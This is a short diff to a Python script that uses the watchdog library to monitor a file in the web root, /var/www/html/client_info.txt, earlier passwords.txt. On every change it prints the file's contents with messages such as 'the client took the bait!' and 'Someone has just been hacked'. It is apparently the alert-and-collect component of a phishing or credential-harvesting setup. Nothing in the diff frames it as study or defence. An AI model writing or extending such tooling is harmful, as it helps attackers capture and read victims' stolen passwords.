@@ -5,18 +5,17 @@ from watchdog.events import FileSystemEventHandler
 
 class MyHandler(FileSystemEventHandler):
     """
-    This class is used for listening to file change event...
+    handle file changes
     """
-
     def on_modified(self, event):
-        print(
-            'Someone has just been hacked,New password came , please look the /var/www/html/client_info.txt file'
-            ' for more information')
+        print('the client took the bait! the new information is:\n')
+        with open('/var/www/html/client_info.txt','r') as f:
+            print(f.read()+"\n")
 
 
 def start_listen():
     """
-    start listening to  file change events on >> /var/www/html/passwords.txt << (hard coded)
+    listening to changes in the file:  /var/www/html/client_info.txt
     """
     event_handler = MyHandler()
     observer = Observer()
